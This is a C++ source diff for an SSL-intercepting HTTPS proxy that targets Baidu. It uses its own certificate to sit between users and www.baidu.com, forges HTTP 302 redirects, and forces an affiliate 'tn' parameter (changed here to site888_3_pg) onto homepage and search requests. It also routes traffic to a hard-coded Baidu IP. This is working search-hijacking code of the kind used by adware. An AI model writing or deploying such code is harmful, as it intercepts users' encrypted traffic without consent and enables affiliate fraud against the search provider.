@@ -247,13 +247,13 @@ VOID HandleHttpsConnect( CSSLTcpSocket *pclientsock,CSSLTcpSocket *premotesock ,
 					
 					strClientSendBuffer+=chRecvBuffer;
 
-					if ( strHost == "www.baidu.com" )
-					{
-						OutputDebugStringA(chRecvBuffer);
-						OutputDebugStringA("\r\n");
-						OutputDebugStringA("--------------------------------------------------------------------------------------------------");
-						OutputDebugStringA("\r\n");
-					}
+// 					if ( strHost == "www.baidu.com" )
+// 					{
+// 						OutputDebugStringA(chRecvBuffer);
+// 						OutputDebugStringA("\r\n");
+// 						OutputDebugStringA("--------------------------------------------------------------------------------------------------");
+// 						OutputDebugStringA("\r\n");
+// 					}
 					
 					//DebugStringA("clientSock RecvData %d",nRecvLen);
 					
@@ -264,55 +264,52 @@ VOID HandleHttpsConnect( CSSLTcpSocket *pclientsock,CSSLTcpSocket *premotesock ,
 						strClientSendBuffer="";
 
  						CStringA strUrl;
+						CStringA strHost;
  						strUrl = sendparser.GetParseUrl();
+						strHost = sendparser.GetHost();
  						OutputDebugStringA("Url: "+strUrl+"\r\n");
-// 						if ( 
-// 							(strUrl.Find("www.baidu.com/?tn=") >= 0 && strUrl.Find("www.baidu.com/?tn=123_pg") < 0)
-// 							|| strUrl == "http://www.baidu.com/"
-// 							)
-// 						{
-// 							bTransmitData = FALSE;
-// 							LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
-// 							pclientsock->SendData((PVOID)pchResponseData,strlen(pchResponseData));
-// 						}
 
-						CUrlParser urlparser;
-						urlparser.SetUrl(strUrl);
-						urlparser.ParseUrl();
-						CStringA strPath;
-						strPath = urlparser.GetPath();
-
-						if ( strPath == "/" )
+						if ( strHost.CompareNoCase("www.baidu.com") == 0 )
 						{
-							CStringA strPid;
-							urlparser.GetParamValueByName("tn",strPid);
-							if ( strPid.CompareNoCase("123_pg") != 0 )
+							CUrlParser urlparser;
+							urlparser.SetUrl(strUrl);
+							urlparser.ParseUrl();
+							CStringA strPath;
+							strPath = urlparser.GetPath();
+
+							if ( strPath == "/" || strPath == "/index.php" )
 							{
-								LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
-								pclientsock->SendData((PVOID)pchResponseData,strlen(pchResponseData));
-								bTransmitData = FALSE;
+								CStringA strPid;
+								urlparser.GetParamValueByName("tn",strPid);
+								if ( strPid.CompareNoCase("site888_3_pg") != 0 )
+								{
+									LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=site888_3_pg\r\nConnection: Close\r\nContent-Length:0\r\n\r\n";
+									pclientsock->SendData((PVOID)pchResponseData,strlen(pchResponseData));
+									bTransmitData = FALSE;
+								}
+
+
 							}
 
-							
-						}
-
-						if ( strPath == "/s" )
-						{
-							CStringA strPid;
-							urlparser.GetParamValueByName("tn",strPid);
-							if ( strPid.CompareNoCase("123_pg") != 0 )
+							if ( strPath == "/s" )
 							{
-								CStringA strNewUrl;
-								urlparser.SetParamValueByName("tn","123_pg");
-								strNewUrl = urlparser.BuildUrl();
-								strNewUrl.Replace("http://","https://");
-								CStringA strReponseData;
-								strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\n\r\n",strNewUrl);
+								CStringA strPid;
+								urlparser.GetParamValueByName("tn",strPid);
+								if ( strPid.CompareNoCase("site888_3_pg") != 0 )
+								{
+									CStringA strNewUrl;
+									urlparser.AddOrSetParamValue("tn","site888_3_pg");
+									strNewUrl = urlparser.BuildUrl();
+									strNewUrl.Replace("http://","https://");
+									CStringA strReponseData;
+									strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\nConnection: Close\r\nContent-Length:0\r\n\r\n",strNewUrl);
 
-								pclientsock->SendData((PVOID)strReponseData.GetBuffer(),strReponseData.GetLength());
-								bTransmitData = FALSE;
+									pclientsock->SendData((PVOID)strReponseData.GetBuffer(),strReponseData.GetLength());
+									bTransmitData = FALSE;
+								}
 							}
 						}
+
 
 					}
 					
@@ -356,6 +353,7 @@ DWORD WINAPI HttpsRequestHandleThread( PVOID pParam )
 		return 0;
 	}
 	
+	BOOL bTransmitData = TRUE;
 	char chReadBuffer[4096];
 	int  nReadTotalLen = 0;
 	CStringA strHost;
@@ -387,34 +385,35 @@ DWORD WINAPI HttpsRequestHandleThread( PVOID pParam )
 				CStringA strPath;
 				strPath = urlparser.GetPath();
 
-				if ( strPath == "/" )
+				if ( strPath == "/" || strPath == "/index.php" )
 				{
 					CStringA strPid;
 					urlparser.GetParamValueByName("tn",strPid);
-					if ( strPid.CompareNoCase("123_pg") != 0 )
+					if ( strPid.CompareNoCase("site888_3_pg") != 0 )
 					{
-						LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=123_pg\r\n\r\n";
+						LPCSTR pchResponseData = "HTTP/1.1 302 Move\r\nLocation: https://www.baidu.com/?tn=site888_3_pg\r\nConnection: Close\r\nContent-Length:0\r\n\r\n";
 						psslclient->SendData((PVOID)pchResponseData,strlen(pchResponseData));
+						bTransmitData = FALSE;
 					}
-					//bTransmitData = FALSE;
+					
 
-					return 0;
 				}
 
 				if ( strPath == "/s" )
 				{
 					CStringA strPid;
 					urlparser.GetParamValueByName("tn",strPid);
-					if ( strPid.CompareNoCase("123_pg") != 0 )
+					if ( strPid.CompareNoCase("site888_3_pg") != 0 )
 					{
 						CStringA strNewUrl;
-						urlparser.SetParamValueByName("tn","123_pg");
+						urlparser.AddOrSetParamValue("tn","site888_3_pg");
 						strNewUrl = urlparser.BuildUrl();
 						strNewUrl.Replace("http://","https://");
 						CStringA strReponseData;
-						strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\n\r\n",strNewUrl);
+						strReponseData.Format("HTTP/1.1 302 Move\r\nLocation: %s\r\nConnection: Close\r\nContent-Length:0\r\n\r\n",strNewUrl);
 						
 						psslclient->SendData((PVOID)strReponseData.GetBuffer(),strReponseData.GetLength());
+						bTransmitData = FALSE;
 					}
 				}
 
@@ -431,9 +430,16 @@ DWORD WINAPI HttpsRequestHandleThread( PVOID pParam )
 	{
 		CSSLTcpSocket *psslremote = new CSSLTcpSocket();
 		psslremote->CreateSSLTcpSocketForClient();
-		psslremote->SSLConnect(strHost,443);
+		psslremote->SSLConnect(/*strHost*/"61.135.169.121",443);
 
-		int nRet = psslremote->SendData((PVOID)chReadBuffer,nReadTotalLen);
+		if (bTransmitData)
+		{
+			int nRet = psslremote->SendData((PVOID)chReadBuffer,nReadTotalLen);
+		}
+		else
+		{
+			int a=0;
+		}
 
 		HandleHttpsConnect(psslclient,psslremote,strHost);
 	}
@@ -448,7 +454,7 @@ VOID HttpsProxyServer()
 	BOOL bRes = sslsock.CreateSSLTcpSocketForServer( "server.crt","server.key" );
 	if ( bRes )
 	{
-		sslsock.InitAccept(553);
+		sslsock.InitAccept(443);
 
 		while (TRUE)
 		{
@@ -466,8 +472,8 @@ VOID HttpsProxyServer()
 #pragma comment(lib,"urlmon")
 int _tmain(int argc, _TCHAR* argv[])
 {
-	//HttpsProxyServer();
-	HttpProxyServer();
+	HttpsProxyServer();
+	//HttpProxyServer();
 
 	Sleep(500);
 
